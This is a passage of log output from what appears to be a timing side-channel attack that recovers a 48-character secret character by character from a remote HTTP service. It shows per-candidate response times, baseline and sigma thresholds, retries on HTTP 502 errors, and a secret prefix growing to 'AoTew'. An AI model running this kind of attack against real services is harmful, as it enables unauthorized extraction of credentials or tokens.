+  [31/62] 'u': 140.22 ms
+  [32/62] 'v': 117.39 ms
+  [33/62] 'w': 105.01 ms
+  [34/62] 'x': 111.34 ms
+  [35/62] 'y': 110.19 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.05s (1/12)...
+  [36/62] 'z': 104.91 ms
+  [37/62] 'A': 110.32 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.57s (1/12)...
+  [38/62] 'B': 111.55 ms
+  [39/62] 'C': 107.96 ms
+  [40/62] 'D': 106.64 ms
+  [41/62] 'E': 107.44 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.93s (1/12)...
+  [42/62] 'F': 110.63 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 112.69 ms
+  [44/62] 'H': 110.84 ms
+  [45/62] 'I': 115.53 ms
+  [46/62] 'J': 118.32 ms
+  [47/62] 'K': 125.48 ms
+  [48/62] 'L': 110.39 ms
+  [49/62] 'M': 115.21 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [50/62] 'N': 106.49 ms
+  [51/62] 'O': 109.01 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [52/62] 'P': 102.36 ms
+  [53/62] 'Q': 107.36 ms
+  [54/62] 'R': 108.65 ms
+  [55/62] 'S': 113.05 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [56/62] 'T': 109.97 ms
+  [57/62] 'U': 111.90 ms
+  [58/62] 'V': 114.95 ms
+  [59/62] 'W': 110.41 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [60/62] 'X': 105.94 ms
+  [61/62] 'Y': 101.97 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [62/62] 'Z': 102.94 ms
+  [screening] 62 candidates in 129.0s; baseline: 110.40 ms; sigma: 6.57 ms; margin: 19.72 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 1/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('K', 115.82), ('c', 107.99), ('j', 107.64), ('u', 104.96)]
+  [!] No clear winner: best final 115.82 ms < baseline 110.40 + margin 19.72 = 130.12 ms.
+      Re-running Phase 1 once with fresh samples...
+  [ 1/62] '0': 104.99 ms
+  [ 2/62] '1': 104.07 ms
+  [ 3/62] '2': 104.72 ms
+  [ 4/62] '3': 108.31 ms
+  [ 5/62] '4': 110.38 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [ 6/62] '5': 110.99 ms
+  [ 7/62] '6': 105.57 ms
+  [ 8/62] '7': 134.29 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 9/62] '8': 111.56 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [10/62] '9': 114.91 ms
+  [11/62] 'a': 109.93 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [12/62] 'b': 126.26 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [13/62] 'c': 115.19 ms
+  [14/62] 'd': 109.18 ms
+  [15/62] 'e': 112.88 ms
+  [16/62] 'f': 111.38 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [17/62] 'g': 99.79 ms
+  [18/62] 'h': 109.39 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [19/62] 'i': 119.02 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [20/62] 'j': 117.16 ms
+  [21/62] 'k': 102.28 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [22/62] 'l': 111.96 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [23/62] 'm': 115.48 ms
+  [24/62] 'n': 108.85 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [25/62] 'o': 123.14 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 111.42 ms
+  [27/62] 'q': 125.47 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [28/62] 'r': 110.79 ms
+  [29/62] 's': 106.08 ms
+  [30/62] 't': 99.10 ms
+  [31/62] 'u': 107.95 ms
+  [32/62] 'v': 107.39 ms
+  [33/62] 'w': 108.94 ms
+  [34/62] 'x': 105.61 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [35/62] 'y': 105.36 ms
+  [36/62] 'z': 114.94 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [37/62] 'A': 117.51 ms
+  [38/62] 'B': 99.71 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [39/62] 'C': 99.92 ms
+  [40/62] 'D': 112.93 ms
+  [41/62] 'E': 104.28 ms
+  [42/62] 'F': 121.53 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 125.37 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [44/62] 'H': 121.98 ms
+  [45/62] 'I': 110.24 ms
+  [46/62] 'J': 110.74 ms
+  [47/62] 'K': 107.52 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [48/62] 'L': 110.05 ms
+  [49/62] 'M': 110.65 ms
+  [50/62] 'N': 110.04 ms
+  [51/62] 'O': 116.25 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [52/62] 'P': 122.85 ms
+  [53/62] 'Q': 107.36 ms
+  [54/62] 'R': 112.46 ms
+  [55/62] 'S': 117.72 ms
+  [56/62] 'T': 160.66 ms
+  [57/62] 'U': 113.57 ms
+  [58/62] 'V': 113.87 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [59/62] 'W': 112.32 ms
+  [60/62] 'X': 107.52 ms
+  [61/62] 'Y': 124.29 ms
+  [62/62] 'Z': 112.69 ms
+  [screening retry] 62 candidates in 185.6s; baseline: 110.89 ms; sigma: 5.98 ms; margin: 17.94 ms
+  => Retry Phase 1 winner 'T': 160.66 ms (threshold 128.83 ms)
+  [OK] Picked 'T' (160.66 ms) -> AoT  [359.1s/pos, ~269 min left]
+
+[+] Position 4/48 | Prefix: 'AoT'
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [ 1/62] '0': 110.85 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 115.84 ms
+  [ 3/62] '2': 113.61 ms
+  [ 4/62] '3': 132.28 ms
+  [ 5/62] '4': 106.11 ms
+  [ 6/62] '5': 101.35 ms
+  [ 7/62] '6': 104.50 ms
+  [ 8/62] '7': 141.05 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [ 9/62] '8': 111.13 ms
+  [10/62] '9': 107.72 ms
+  [11/62] 'a': 115.50 ms
+  [12/62] 'b': 98.39 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [13/62] 'c': 111.26 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [14/62] 'd': 111.52 ms
+  [15/62] 'e': 112.25 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [16/62] 'f': 113.12 ms
+  [17/62] 'g': 111.40 ms
+  [18/62] 'h': 112.56 ms
+  [19/62] 'i': 106.66 ms
+  [20/62] 'j': 109.00 ms
+  [21/62] 'k': 99.49 ms
+  [22/62] 'l': 111.44 ms
+  [23/62] 'm': 104.76 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [24/62] 'n': 116.11 ms
+  [25/62] 'o': 115.83 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [26/62] 'p': 105.57 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [27/62] 'q': 119.67 ms
+  [28/62] 'r': 119.09 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [29/62] 's': 106.60 ms
+  [30/62] 't': 115.96 ms
+  [31/62] 'u': 109.02 ms
+  [32/62] 'v': 99.92 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [33/62] 'w': 111.33 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [34/62] 'x': 118.66 ms
+  [35/62] 'y': 113.58 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [36/62] 'z': 112.51 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 3.0s, cadence -> 2.50s (2/12)...
+  [37/62] 'A': 99.80 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [38/62] 'B': 111.26 ms
+  [39/62] 'C': 108.50 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [40/62] 'D': 118.59 ms
+  [41/62] 'E': 107.60 ms
+  [42/62] 'F': 104.95 ms
+  [43/62] 'G': 109.90 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [44/62] 'H': 113.39 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [45/62] 'I': 109.92 ms
+  [46/62] 'J': 102.91 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [47/62] 'K': 122.40 ms
+  [48/62] 'L': 517.87 ms
+  [49/62] 'M': 118.22 ms
+  [50/62] 'N': 104.85 ms
+  [51/62] 'O': 107.54 ms
+  [52/62] 'P': 106.77 ms
+  [53/62] 'Q': 110.78 ms
+  [54/62] 'R': 103.94 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [55/62] 'S': 100.51 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [56/62] 'T': 117.41 ms
+  [57/62] 'U': 124.03 ms
+  [58/62] 'V': 106.16 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [59/62] 'W': 107.25 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [60/62] 'X': 110.45 ms
+  [61/62] 'Y': 231.45 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [62/62] 'Z': 112.21 ms
+  [screening] 62 candidates in 188.1s; baseline: 111.19 ms; sigma: 6.84 ms; margin: 20.53 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 1/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('7', 121.22), ('Y', 118.03), ('3', 110.69), ('L', 104.4)]
+  [!] No clear winner: best final 121.22 ms < baseline 111.19 + margin 20.53 = 131.72 ms.
+      Re-running Phase 1 once with fresh samples...
+  [ 1/62] '0': 109.84 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 116.75 ms
+  [ 3/62] '2': 107.75 ms
+  [ 4/62] '3': 106.80 ms
+  [ 5/62] '4': 106.21 ms
+  [ 6/62] '5': 110.23 ms
+  [ 7/62] '6': 113.96 ms
+  [ 8/62] '7': 107.50 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [ 9/62] '8': 101.50 ms
+  [10/62] '9': 112.69 ms
+  [11/62] 'a': 118.33 ms
+  [12/62] 'b': 121.35 ms
+  [13/62] 'c': 129.68 ms
+  [14/62] 'd': 106.83 ms
+  [15/62] 'e': 648.00 ms
+  [16/62] 'f': 113.23 ms
+  [17/62] 'g': 107.08 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.77s (1/12)...
+  [18/62] 'h': 107.96 ms
+  [19/62] 'i': 148.61 ms
+  [20/62] 'j': 111.53 ms
+  [21/62] 'k': 228.83 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.95s (1/12)...
+  [22/62] 'l': 362.52 ms
+  [23/62] 'm': 193.00 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.43s (1/12)...
+  [24/62] 'n': 167.98 ms
+  [25/62] 'o': 192.46 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.14s (1/12)...
+  [26/62] 'p': 111.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [27/62] 'q': 162.15 ms
+  [28/62] 'r': 104.62 ms
+  [29/62] 's': 109.54 ms
+  [30/62] 't': 105.72 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [31/62] 'u': 102.72 ms
+  [32/62] 'v': 101.74 ms
+  [33/62] 'w': 114.82 ms
+  [34/62] 'x': 108.14 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [35/62] 'y': 103.54 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [36/62] 'z': 106.86 ms
+  [37/62] 'A': 101.64 ms
+  [38/62] 'B': 107.45 ms
+  [39/62] 'C': 106.44 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [40/62] 'D': 116.68 ms
+  [41/62] 'E': 97.34 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [42/62] 'F': 102.00 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [43/62] 'G': 102.13 ms
+  [44/62] 'H': 101.06 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [45/62] 'I': 103.80 ms
+  [46/62] 'J': 101.92 ms
+  [47/62] 'K': 101.09 ms
+  [48/62] 'L': 98.80 ms
+  [49/62] 'M': 97.74 ms
+  [50/62] 'N': 100.60 ms
+  [51/62] 'O': 104.30 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [52/62] 'P': 103.19 ms
+  [53/62] 'Q': 104.70 ms
+  [54/62] 'R': 104.15 ms
+  [55/62] 'S': 102.48 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [56/62] 'T': 97.64 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [57/62] 'U': 104.69 ms
+  [58/62] 'V': 153.71 ms
+  [59/62] 'W': 106.23 ms
+  [60/62] 'X': 114.41 ms
+  [61/62] 'Y': 105.09 ms
+  [62/62] 'Z': 98.33 ms
+  [screening retry] 62 candidates in 153.8s; baseline: 106.84 ms; sigma: 7.24 ms; margin: 21.72 ms
+  => Retry Phase 1 winner 'e': 648.00 ms (threshold 128.56 ms)
+  [OK] Picked 'e' (648.00 ms) -> AoTe  [383.5s/pos, ~281 min left]
+
+[+] Position 5/48 | Prefix: 'AoTe'
+  [ 1/62] '0': 101.33 ms
+  [ 2/62] '1': 102.63 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [ 3/62] '2': 111.33 ms
+  [ 4/62] '3': 114.85 ms
+  [ 5/62] '4': 101.75 ms
+  [ 6/62] '5': 107.07 ms
+  [ 7/62] '6': 110.75 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.40s (1/12)...
+  [ 8/62] '7': 102.55 ms
+  [ 9/62] '8': 101.95 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.10s (1/12)...
+  [10/62] '9': 103.50 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [11/62] 'a': 111.37 ms
+  [12/62] 'b': 97.18 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [13/62] 'c': 116.03 ms
+  [14/62] 'd': 101.52 ms
+  [15/62] 'e': 109.36 ms
+  [16/62] 'f': 115.65 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [17/62] 'g': 114.63 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 3.0s, cadence -> 2.50s (2/12)...
+  [18/62] 'h': 113.50 ms
+  [19/62] 'i': 113.68 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [20/62] 'j': 232.52 ms
+  [21/62] 'k': 147.51 ms
+  [22/62] 'l': 171.84 ms
+  [23/62] 'm': 105.50 ms
+  [24/62] 'n': 136.56 ms
+  [25/62] 'o': 110.14 ms
+  [26/62] 'p': 107.96 ms
+  [27/62] 'q': 100.56 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.39s (1/12)...
+  [28/62] 'r': 100.29 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [29/62] 's': 108.80 ms
+  [30/62] 't': 103.98 ms
+  [31/62] 'u': 96.97 ms
+  [32/62] 'v': 104.27 ms
+  [33/62] 'w': 100.13 ms
+  [34/62] 'x': 100.59 ms
+  [35/62] 'y': 106.84 ms
+  [36/62] 'z': 102.47 ms
+  [37/62] 'A': 123.63 ms
+  [38/62] 'B': 107.44 ms
+  [39/62] 'C': 108.35 ms
+  [40/62] 'D': 109.68 ms
+  [41/62] 'E': 101.64 ms
+  [42/62] 'F': 113.37 ms
+  [43/62] 'G': 107.58 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [44/62] 'H': 103.97 ms
+  [45/62] 'I': 117.61 ms
+  [46/62] 'J': 119.63 ms
+  [47/62] 'K': 104.15 ms
+  [48/62] 'L': 109.80 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.62s (1/12)...
+  [49/62] 'M': 106.20 ms
+  [50/62] 'N': 109.95 ms
+  [51/62] 'O': 326.95 ms
+  [52/62] 'P': 159.95 ms
+  [53/62] 'Q': 99.57 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.67s (1/12)...
+  [54/62] 'R': 107.61 ms
+  [55/62] 'S': 105.81 ms
+  [56/62] 'T': 106.78 ms
+  [57/62] 'U': 110.62 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.82s (1/12)...
+  [58/62] 'V': 113.00 ms
+  [59/62] 'W': 108.17 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.23s (1/12)...
+  [60/62] 'X': 113.61 ms
+  [61/62] 'Y': 102.96 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.85s (1/12)...
+  [62/62] 'Z': 102.95 ms
+  [screening] 62 candidates in 115.1s; baseline: 107.79 ms; sigma: 7.75 ms; margin: 23.24 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 2.27s (1/12)...
+     phase-2 round 1/3
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.29s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('O', 106.38), ('j', 103.69), ('P', 103.45), ('l', 102.26)]
+  [!] No clear winner: best final 106.38 ms < baseline 107.79 + margin 23.24 = 131.03 ms.
+      Re-running Phase 1 once with fresh samples...
+  [ 1/62] '0': 109.82 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 112.33 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 3/62] '2': 117.22 ms
+  [ 4/62] '3': 111.49 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 5/62] '4': 108.23 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [HTTP 502] retrying in 3.0s, cadence -> 2.50s (2/12)...
+  [ 6/62] '5': 113.07 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 7/62] '6': 113.33 ms
+  [ 8/62] '7': 97.52 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 9/62] '8': 114.25 ms
+  [10/62] '9': 111.67 ms
+  [11/62] 'a': 122.95 ms
+  [12/62] 'b': 107.38 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [13/62] 'c': 102.75 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [14/62] 'd': 107.07 ms
+  [15/62] 'e': 113.55 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [16/62] 'f': 103.88 ms
+  [17/62] 'g': 96.25 ms
+  [18/62] 'h': 98.76 ms
+  [19/62] 'i': 123.33 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [20/62] 'j': 99.69 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [21/62] 'k': 117.10 ms
+  [22/62] 'l': 111.04 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [23/62] 'm': 111.65 ms
+  [24/62] 'n': 108.57 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [25/62] 'o': 127.76 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [26/62] 'p': 112.55 ms
+  [27/62] 'q': 110.84 ms
+  [28/62] 'r': 117.27 ms
+  [29/62] 's': 102.11 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [30/62] 't': 100.42 ms
+  [31/62] 'u': 111.82 ms
+  [32/62] 'v': 102.73 ms
+  [33/62] 'w': 168.02 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [34/62] 'x': 113.30 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [35/62] 'y': 120.40 ms
+  [36/62] 'z': 104.16 ms
+  [37/62] 'A': 106.14 ms
+  [38/62] 'B': 105.19 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [39/62] 'C': 109.50 ms
+  [40/62] 'D': 96.25 ms
+  [41/62] 'E': 110.30 ms
+  [42/62] 'F': 119.42 ms
+  [43/62] 'G': 97.52 ms
+  [44/62] 'H': 99.38 ms
+  [45/62] 'I': 111.97 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [46/62] 'J': 107.45 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [47/62] 'K': 109.01 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [48/62] 'L': 108.29 ms
+  [49/62] 'M': 109.28 ms
+  [50/62] 'N': 104.14 ms
+  [51/62] 'O': 101.73 ms
+  [52/62] 'P': 109.29 ms
+  [53/62] 'Q': 111.98 ms
+  [54/62] 'R': 114.88 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [55/62] 'S': 106.01 ms
+  [56/62] 'T': 107.80 ms
+  [57/62] 'U': 106.93 ms
+  [58/62] 'V': 108.10 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [59/62] 'W': 105.84 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [60/62] 'X': 114.17 ms
+  [61/62] 'Y': 105.48 ms
+  [62/62] 'Z': 114.73 ms
+  [screening retry] 62 candidates in 201.6s; baseline: 109.29 ms; sigma: 5.98 ms; margin: 17.93 ms
+  => Retry Phase 1 winner 'w': 168.02 ms (threshold 127.21 ms)
+  [OK] Picked 'w' (168.02 ms) -> AoTew  [350.6s/pos, ~251 min left]
+
+[+] Position 6/48 | Prefix: 'AoTew'
+  [ 1/62] '0': 111.70 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 108.33 ms
+  [ 3/62] '2': 106.57 ms
+  [ 4/62] '3': 103.32 ms
+  [ 5/62] '4': 98.50 ms
+  [ 6/62] '5': 104.61 ms
+  [ 7/62] '6': 113.26 ms
+  [ 8/62] '7': 112.96 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [ 9/62] '8': 111.96 ms
+  [10/62] '9': 114.56 ms
+  [11/62] 'a': 157.06 ms
+  [12/62] 'b': 106.63 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.09s (1/12)...
+  [13/62] 'c': 95.42 ms
+  [14/62] 'd': 109.55 ms
+  [15/62] 'e': 121.15 ms
+  [16/62] 'f': 127.37 ms
+  [17/62] 'g': 113.63 ms
+  [18/62] 'h': 121.03 ms
+  [19/62] 'i': 99.30 ms
+  [20/62] 'j': 118.02 ms
+  [21/62] 'k': 99.73 ms
+  [22/62] 'l': 110.40 ms
+  [23/62] 'm': 106.01 ms
+  [24/62] 'n': 115.19 ms
+  [25/62] 'o': 112.32 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [26/62] 'p': 114.77 ms
+  [27/62] 'q': 110.29 ms
+  [28/62] 'r': 117.75 ms
+  [29/62] 's': 115.95 ms
+  [30/62] 't': 116.28 ms
+  [31/62] 'u': 110.19 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.55s (1/12)...
+  [32/62] 'v': 110.13 ms
+  [33/62] 'w': 118.01 ms
+  [34/62] 'x': 116.02 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.83s (1/12)...
+  [35/62] 'y': 116.63 ms
+  [36/62] 'z': 108.03 ms
+  [37/62] 'A': 108.13 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.24s (1/12)...
+  [38/62] 'B': 106.54 ms
+  [39/62] 'C': 108.17 ms
+  [40/62] 'D': 132.98 ms
+  [41/62] 'E': 110.09 ms
+  [42/62] 'F': 104.40 ms
+  [43/62] 'G': 118.02 ms
+  [44/62] 'H': 120.47 ms
+  [45/62] 'I': 113.83 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.71s (1/12)...
+  [46/62] 'J': 123.51 ms
+  [47/62] 'K': 109.19 ms
+  [48/62] 'L': 118.47 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.07s (1/12)...
+  [49/62] 'M': 101.50 ms
+  [50/62] 'N': 122.19 ms
+  [51/62] 'O': 104.86 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.60s (1/12)...
+  [52/62] 'P': 111.05 ms
+  [53/62] 'Q': 109.08 ms
+  [54/62] 'R': 111.36 ms
+  [55/62] 'S': 117.39 ms
+  [56/62] 'T': 110.36 ms
+  [57/62] 'U': 99.98 ms
+  [58/62] 'V': 106.46 ms
+  [59/62] 'W': 121.79 ms
+  [60/62] 'X': 112.50 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 0.74s (1/12)...
+  [61/62] 'Y': 104.20 ms
+  [62/62] 'Z': 109.10 ms
+  [screening] 62 candidates in 88.6s; baseline: 111.21 ms; sigma: 7.04 ms; margin: 21.12 ms
+  => Phase 2: top-4, 3 extra samples each, interleaved
+  [HTTP 502] retrying in 1.5s, cadence -> 1.11s (1/12)...
+     phase-2 round 1/3
+  [HTTP 502] retrying in 1.5s, cadence -> 1.66s (1/12)...
+     phase-2 round 2/3
+  [HTTP 502] retrying in 1.5s, cadence -> 2.04s (1/12)...
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+     phase-2 round 3/3
+  => Verified finalists: [('a', 129.65), ('f', 116.5), ('J', 113.55), ('D', 109.46)]
+  [!] No clear winner: best final 129.65 ms < baseline 111.21 + margin 21.12 = 132.33 ms.
+      Re-running Phase 1 once with fresh samples...
+  [ 1/62] '0': 98.11 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 2/62] '1': 113.63 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 3/62] '2': 113.44 ms
+  [ 4/62] '3': 112.84 ms
+  [ 5/62] '4': 109.46 ms
+  [ 6/62] '5': 105.75 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 2.50s (1/12)...
+  [ 7/62] '6': 114.82 ms
+  [ 8/62] '7': 121.14 ms
+  [ 9/62] '8': 113.55 ms
+  [10/62] '9': 106.60 ms
+  [11/62] 'a': 102.80 ms
+  [12/62] 'b': 109.30 ms
+  [13/62] 'c': 127.56 ms
+  [HTTP 502] retrying in 1.5s, cadence -> 1.70s (1/12)...
+  [14/62] 'd': 120.41 ms
+  [15/62] 'e': 113.53 ms
+  [16/62] 'f': 105.69 ms
+  [17/62] 'g': 99.71 ms
